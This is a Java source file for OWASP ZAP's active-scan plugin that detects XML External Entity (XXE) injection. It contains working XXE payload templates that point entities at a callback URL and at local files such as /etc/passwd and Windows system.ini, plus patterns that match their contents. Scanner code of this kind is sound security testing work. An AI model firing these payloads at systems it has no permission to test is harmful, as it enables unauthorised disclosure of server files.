/*
 * Zed Attack Proxy (ZAP) and its related class files.
 *
 * ZAP is an HTTP/HTTPS proxy for assessing web application security.
 *
 * Copyright 2014 The ZAP Development Team
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package org.zaproxy.zap.extension.ascanrulesBeta;

import java.io.IOException;
import java.security.SecureRandom;
import java.text.MessageFormat;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import org.apache.log4j.Logger;
import org.parosproxy.paros.Constant;
import org.parosproxy.paros.core.scanner.AbstractAppPlugin;
import org.parosproxy.paros.core.scanner.Alert;
import org.parosproxy.paros.core.scanner.Category;
import org.parosproxy.paros.network.HttpHeader;
import org.parosproxy.paros.network.HttpMessage;
import org.parosproxy.paros.network.HttpStatusCode;
import org.zaproxy.zap.extension.callback.ExtensionCallback;
import org.zaproxy.zap.model.Vulnerabilities;
import org.zaproxy.zap.model.Vulnerability;

/**
 * https://www.owasp.org/index.php/XML_External_Entity_%28XXE%29_Processing
 *
 * @author yhawke (2104)
 */
public class XXEPlugin extends AbstractAppPlugin implements ChallengeCallbackPlugin {

    private static final String MESSAGE_PREFIX = "ascanbeta.xxeplugin.";
    private static final int PLUGIN_ID = 90023;

    // Get the correct vulnerability description from WASC
    private static final Vulnerability vuln = Vulnerabilities.getVulnerability("wasc_43");
    private static final int CHALLENGE_LENGTH = 16;

    // Payload built on examples retrieved in:
    // https://www.owasp.org/index.php/XML_External_Entity_%28XXE%29_Processing
    //
    private static final String ATTACK_ENTITY = "&zapxxe;";

    static final String ATTACK_HEADER =
            "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n"
                    + "<!DOCTYPE foo [\n"
                    + "  <!ELEMENT foo ANY >\n"
                    + "  <!ENTITY zapxxe SYSTEM \"{0}\">\n"
                    + "]>\n";

    private static final String ATTACK_BODY = "<foo>" + ATTACK_ENTITY + "</foo>";

    // XML standard from W3C Consortium
    // ---------------------------------------------
    // STag ::= '<' Name (S Attribute)* S? '>'
    // NameStartChar ::= ":" | [A-Z] | "_" | [a-z] | [#xC0-#xD6] | [#xD8-#xF6] | [#xF8-#x2FF] |
    // [#x370-#x37D] | [#x37F-#x1FFF] | [#x200C-#x200D] | [#x2070-#x218F] | [#x2C00-#x2FEF] |
    // [#x3001-#xD7FF] | [#xF900-#xFDCF] | [#xFDF0-#xFFFD] | [#x10000-#xEFFFF]
    // NameChar ::= NameStartChar | "-" | "." | [0-9] | #xB7 | [#x0300-#x036F] | [#x203F-#x2040]
    // Name ::= NameStartChar (NameChar)*
    // S ::= (0x20 0x09 0x0d 0x0a)+ in Java (\s)
    // Attribute ::= Name Eq AttValue
    // Eq ::= S? '=' S?
    // AttValue ::= '"' ([^<&"] | Reference)* '"' |  "'" ([^<&'] | Reference)* "'"
    // ----------------------------------------------
    private static final String tagRegex =
            "\\<[\\_\\:A-Za-z][\\_\\:A-Za-z0-9\\-\\.]*\\s*[^\\>]*\\>((?:\\<\\!\\[CDATA\\[(?:.(?<!\\]\\]>))*\\]\\]>)|(?:[^\\<\\&]*))\\<\\/[\\_\\:A-Za-z][\\_\\:A-Za-z0-9\\-\\.]*\\s*\\>";
    private static final Pattern tagPattern = Pattern.compile(tagRegex);

    // Local targets for local file inclusion
    private static final String[] LOCAL_FILE_TARGETS = {
        "file:///etc/passwd", "file:///c:/Windows/system.ini", "file:///d:/Windows/system.ini"
    };

    private static final Pattern[] LOCAL_FILE_PATTERNS = {
        Pattern.compile("root:.:0:0"),
        Pattern.compile("\\[drivers\\]"),
        Pattern.compile("\\[drivers\\]")
    };

    private static final String xmlHeaderRegex = "<\\?xml.*?\\?>";
    private static final Pattern xmlHeaderPattern =
            Pattern.compile(xmlHeaderRegex, Pattern.CASE_INSENSITIVE);

    // API for the specific challenge/response model
    // Should be a common object for all this plugin instances
    private static XXEPluginCallbackImplementor callbackImplementor =
            new XXEPluginCallbackImplementor();

    // Logger instance
    private static final Logger log = Logger.getLogger(XXEPlugin.class);

    /**
     * Get the unique identifier of this plugin
     *
     * @return this plugin identifier
     */
    @Override
    public int getId() {
        return PLUGIN_ID;
    }

    /**
     * Get the name of this plugin
     *
     * @return the plugin name
     */
    @Override
    public String getName() {
        return Constant.messages.getString(MESSAGE_PREFIX + "name");
    }

    /**
     * Get the description of the vulnerbaility when found
     *
     * @return the vulnerability description
     */
    @Override
    public String getDescription() {
        if (vuln != null) {
            return vuln.getDescription();
        }
        return "Failed to load vulnerability description from file";
    }

    /**
     * Give back the categorization of the vulnerability checked by this plugin (it's an injection
     * category for CODEi)
     *
     * @return a category from the Category enum list
     */
    @Override
    public int getCategory() {
        return Category.INJECTION;
    }

    /**
     * Give back a general solution for the found vulnerability
     *
     * @return the solution that can be put in place
     */
    @Override
    public String getSolution() {
        if (vuln != null) {
            return vuln.getSolution();
        }

        return "Failed to load vulnerability solution from file";
    }

    /**
     * Reports all links and documentation which refers to this vulnerability
     *
     * @return a string based list of references
     */
    @Override
    public String getReference() {
        if (vuln != null) {
            StringBuilder sb = new StringBuilder();
            for (String ref : vuln.getReferences()) {
                if (sb.length() > 0) {
                    sb.append('\n');
                }

                sb.append(ref);
            }

            return sb.toString();
        }

        return "Failed to load vulnerability reference from file";
    }

    /**
     * http://cwe.mitre.org/data/definitions/611.html
     *
     * @return the official CWE id
     */
    @Override
    public int getCweId() {
        return 611;
    }

    /**
     * http://projects.webappsec.org/w/page/13247003/XML%20External%20Entities
     *
     * @return the official WASC id
     */
    @Override
    public int getWascId() {
        return 43;
    }

    /**
     * Give back the risk associated to this vulnerability (high)
     *
     * @return the risk according to the Alert enum
     */
    @Override
    public int getRisk() {
        return Alert.RISK_HIGH;
    }

    @Override
    public void init() {
        if (ChallengeCallbackImplementor.getExtensionCallback() == null) {
            // The callback extension is not available, cant do anything :(
            getParent()
                    .pluginSkipped(
                            this, Constant.messages.getString("ascanbeta.xxeplugin.nocallback"));
        }
    }

    /**
     * Plugin to scan for XXE vulnerabilities. It checks both for local and remote using the ZAP API
     * and also a new model based on parameter substitution
     */
    @Override
    public void scan() {
        // Prepare the message
        HttpMessage msg = getBaseMsg();
        String contentType = msg.getRequestHeader().getHeader(HttpHeader.CONTENT_TYPE);
        String payload = null;

        // first check if it's an XML otherwise it's useless...
        if ((contentType != null) && (contentType.contains("xml"))) {

            // Check #1 : XXE Remote File Inclusion Attack
            // ------------------------------------------------------
            // This attack is described in
            // https://www.owasp.org/index.php/XML_External_Entity_%28XXE%29_Processing
            // using an external bouncing site, in this case we use
            // the ZAP API as a server for the vulnerability check
            // using a challenge/response model based on a random string
            //
            String challenge = randomString(CHALLENGE_LENGTH);

            try {
                // Prepare the attack message
                msg = getNewMsg();
                payload = getCallbackAttackPayload(challenge);
                msg.setRequestBody(payload);

                // Register the callback for future actions
                callbackImplementor.registerCallback(challenge, this, msg);

                // All we need has been done...
                sendAndReceive(msg);

            } catch (IOException ex) {
                // Do not try to internationalise this.. we need an error message in any event..
                // if it's in English, it's still better than not having it at all.
                log.warn(
                        "XXE Injection vulnerability check failed for payload ["
                                + payload
                                + "] due to an I/O error",
                        ex);
            }

            // Check if we've to do only basic analysis (only remote should be done)...
            if (this.getAttackStrength() == AttackStrength.LOW) {
                return;
            }

            // Check #2 : XXE Local File Reflection Attack
            // ------------------------------------------------------
            // This attack is not described anywhere but the idea is
            // very simple: use the original XML request and substitute
            // every content and attribute with a fake entity which
            // include a sensitive local file. If the page goes in error
            // or reflect and manage the sent content you can probably
            // have the file included in the HTML page and you can check it
            //
            msg = getNewMsg();

            try {
                Matcher matcher;
                String localFile;
                String response;
                String requestBody = createLfrPayload(msg.getRequestBody().toString());

                for (int idx = 0; idx < LOCAL_FILE_TARGETS.length; idx++) {
                    // Prepare the message
                    localFile = LOCAL_FILE_TARGETS[idx];
                    payload = MessageFormat.format(requestBody, localFile);
                    // msg = getNewMsg();
                    msg.setRequestBody(payload);

                    // Send message with local file inclusion
                    sendAndReceive(msg);

                    // Parse the result
                    if (msg.getResponseHeader().getStatusCode() == HttpStatusCode.OK) {

                        response = msg.getResponseBody().toString();
                        matcher = LOCAL_FILE_PATTERNS[idx].matcher(response);
                        if (matcher.find()) {

                            // Alert the vulnerability to the main core
                            this.bingo(
                                    Alert.RISK_HIGH,
                                    Alert.CONFIDENCE_MEDIUM,
                                    null, // URI
                                    null, // param
                                    payload, // attack
                                    null, // otherinfo
                                    matcher.group(), // evidence
                                    msg);
                        }
                    }

                    // Check if the scan has been stopped
                    // if yes dispose resources and exit
                    if (isStop()) {
                        // Dispose all resources
                        // Exit the plugin
                        return;
                    }
                }

            } catch (IOException ex) {
                log.warn(
                        "XXE Injection vulnerability check failed for payload ["
                                + payload
                                + "] due to an I/O error",
                        ex);
            }

            // Check if we've to do only medium sized analysis (only remote and reflected will be
            // done)...
            if (this.getAttackStrength() == AttackStrength.MEDIUM) {
                return;
            }

            // Check #3 : XXE Local File Inclusion Attack
            // ------------------------------------------------------
            // This attack is described in
            // https://www.owasp.org/index.php/XML_External_Entity_%28XXE%29_Processing
            // trying to include a local file and maybe have the inclusion back in
            // the result page. This situation is very uncommon because it works
            // only in case of a bare XML parser which execute the conetnt and then
            // gives it back almost untouched (maybe because it applies an XSLT or
            // query it using XPath and give back the result).
            msg = getNewMsg();

            try {
                String localFile;
                String response;
                Matcher matcher;

                for (int idx = 0; idx < LOCAL_FILE_TARGETS.length; idx++) {
                    // Prepare the message
                    localFile = LOCAL_FILE_TARGETS[idx];
                    payload = MessageFormat.format(ATTACK_HEADER + ATTACK_BODY, localFile);
                    // msg = getNewMsg();
                    msg.setRequestBody(payload);

                    // Send message with local file inclusion
                    sendAndReceive(msg);

                    // Parse the result
                    if (msg.getResponseHeader().getStatusCode() == HttpStatusCode.OK) {

                        response = msg.getResponseBody().toString();
                        matcher = LOCAL_FILE_PATTERNS[idx].matcher(response);
                        if (matcher.find()) {

                            // Alert the vulnerability to the main core
                            this.bingo(
                                    Alert.RISK_HIGH,
                                    Alert.CONFIDENCE_MEDIUM,
                                    null, // URI
                                    null, // param
                                    payload, // attack
                                    null, // otherinfo
                                    matcher.group(), // evidence
                                    msg);
                        }
                    }

                    // Check if the scan has been stopped
                    // if yes dispose resources and exit
                    if (isStop()) {
                        // Dispose all resources
                        // Exit the plugin
                        return;
                    }
                }

            } catch (IOException ex) {
                // Do not try to internationalise this.. we need an error message in any event..
                // if it's in English, it's still better than not having it at all.
                log.warn(
                        "XXE Injection vulnerability check failed for payload ["
                                + payload
                                + "] due to an I/O error",
                        ex);
            }
        }
    }

    /**
     * Notification for a successful plugin execution
     *
     * @param challenge the challenge callback that has been used
     * @param targetMessage the original message sent to the target containing the callback
     */
    @Override
    public void notifyCallback(String challenge, HttpMessage targetMessage) {
        if (challenge != null) {

            String evidence = callbackImplementor.getCallbackUrl(challenge);

            // Alert the vulnerability to the main core
            this.bingo(
                    Alert.RISK_HIGH,
                    Alert.CONFIDENCE_MEDIUM,
                    null, // URI
                    null, // param
                    getCallbackAttackPayload(challenge), // attack
                    null, // otherinfo
                    evidence, // evidence
                    targetMessage);
        }
    }

    /**
     * @param challenge
     * @return
     */
    private String getCallbackAttackPayload(String challenge) {
        String message = ATTACK_HEADER + ATTACK_BODY;
        return MessageFormat.format(message, callbackImplementor.getCallbackUrl(challenge));
    }

    /**
     * Get a randomly built string with exactly lenght chars
     *
     * @param length the number of chars of this string
     * @return a string element containing exactly "lenght" characters
     */
    private String randomString(int length) {
        SecureRandom rand = new SecureRandom();
        StringBuilder result = new StringBuilder(length);
        String alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

        for (int i = 0; i < length; i++) {
            result.append(alphabet.charAt(rand.nextInt(alphabet.length())));
        }

        return result.toString();
    }

    /**
     * Only for use in unit tests
     *
     * @param extCallback
     */
    protected void setExtensionCallback(ExtensionCallback extCallback) {
        ChallengeCallbackImplementor.setExtensionCallback(extCallback);
    }

    protected static void unload() {
        if (ChallengeCallbackImplementor.getExtensionCallback() != null) {
            ChallengeCallbackImplementor.getExtensionCallback()
                    .removeCallbackImplementor(callbackImplementor);
        }
    }

    static String createLfrPayload(String requestBody) {
        StringBuilder sb = new StringBuilder(ATTACK_HEADER);

        // Remove original xml header
        Matcher headerMatcher = xmlHeaderPattern.matcher(requestBody);
        requestBody = headerMatcher.replaceAll("");

        // Replace all values in Elements with Attack Entity
        Matcher matcher = tagPattern.matcher(requestBody);
        int endIdx = 0;

        while (matcher.find()) {
            sb.append(requestBody.substring(endIdx, matcher.start(1)));
            sb.append(ATTACK_ENTITY);
            endIdx = matcher.end(1);
        }
        sb.append(requestBody.substring(endIdx));
        return sb.toString();
    }
}
